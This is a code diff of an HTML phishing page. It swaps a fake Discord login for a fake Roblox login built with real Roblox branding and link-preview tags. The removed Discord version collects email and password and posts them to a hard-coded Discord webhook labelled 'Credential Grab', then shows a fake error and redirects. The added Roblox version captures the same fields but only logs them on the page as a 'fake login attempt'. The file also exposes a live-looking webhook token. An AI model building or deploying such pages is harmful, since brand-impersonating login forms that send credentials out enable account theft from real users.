@@ -2,120 +2,112 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Discord</title>
-  <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico" type="image/x-icon">
+  <title>Login - Roblox</title>
+  <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:title" content="Roblox">
+  <meta property="og:description" content="Please login to continue.">
+  <meta property="og:image" content="https://tr.rbxcdn.com/aa7a9b6b5df0b108d1e5d3aa9ef2dc6b/420/420/Image/Png">
+  <meta name="twitter:card" content="summary_large_image">
   <style>
     body {
-      background-color: #0d0d0d;
-      color: #eaeaea;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
       margin: 0;
-    }
-
-    .login-box {
-      background-color: #1a1a1a;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 0 25px rgba(0,255,255,0.1);
-      width: 360px;
+      font-family: 'Helvetica Neue', sans-serif;
+      background-color: #f2f2f2;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
 
-    h2 {
+    .container {
+      background-color: white;
+      width: 400px;
+      padding: 40px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border-radius: 10px;
       text-align: center;
-      color: #7289da;
-      margin-bottom: 25px;
+    }
+
+    .logo {
+      margin-bottom: 30px;
+    }
+
+    .logo img {
+      width: 200px;
     }
 
     input {
       width: 100%;
-      padding: 14px;
+      padding: 12px;
       margin: 10px 0;
-      background-color: #2a2a2a;
-      border: none;
+      border: 1px solid #ccc;
       border-radius: 6px;
-      color: #fff;
-    }
-
-    input::placeholder {
-      color: #888;
+      font-size: 14px;
     }
 
     button {
       width: 100%;
       padding: 12px;
-      background-color: #7289da;
+      background-color: #ff5631;
+      color: white;
       border: none;
       border-radius: 6px;
-      color: #fff;
       font-weight: bold;
-      margin-top: 15px;
+      font-size: 16px;
       cursor: pointer;
-      transition: background-color 0.3s;
+      margin-top: 10px;
     }
 
     button:hover {
-      background-color: #5b6eae;
+      background-color: #e14a26;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+
+    .log-output {
+      margin-top: 25px;
+      padding: 10px;
+      background: #111;
+      font-family: monospace;
+      font-size: 0.9em;
+      color: #00ff99;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <h2>Welcome back</h2>
-    <input type="text" id="email" placeholder="Email (Gmail only)">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="submitCredentials()">Log In</button>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Roblox_Logo_2022.svg" alt="Roblox Logo">
+    </div>
+    <form onsubmit="handleLogin(event)">
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+      <div id="error" class="error"></div>
+    </form>
+    <div id="log-output" class="log-output"></div>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";
+    function handleLogin(e) {
+      e.preventDefault();
 
-    function isValidGmail(email) {
-      return /^[a-zA-Z0-9._%+-]{6,}@gmail\.com$/.test(email);
-    }
-
-    async function submitCredentials() {
-      const email = document.getElementById("email").value.trim();
+      const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value;
 
-      if (!isValidGmail(email)) {
-        alert("Only Gmail addresses are allowed.");
-        return;
-      }
+      const log = `👤 FAKE LOGIN ATTEMPT\nUsername: ${username}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
 
-      const payload = {
-        content: "**🧠 Credential Grab**",
-        embeds: [{
-          title: "🔓 Discord Styled Login Capture",
-          color: 3447003,
-          fields: [
-            { name: "Email", value: email },
-            { name: "Password", value: password },
-            { name: "Time", value: new Date().toLocaleString() }
-          ]
-        }]
-      };
+      console.log(log);
+      document.getElementById("log-output").textContent = log;
 
-      try {
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.warn("Webhook error:", e);
-      }
-
-      setTimeout(() => {
-        alert("Incorrect email or password.");
-        window.location.href = "https://discord.com/login";
-      }, 1200);
+      // Simulate login failure
+      document.getElementById("error").textContent = "Incorrect username or password. Try again.";
     }
   </script>
 </body>
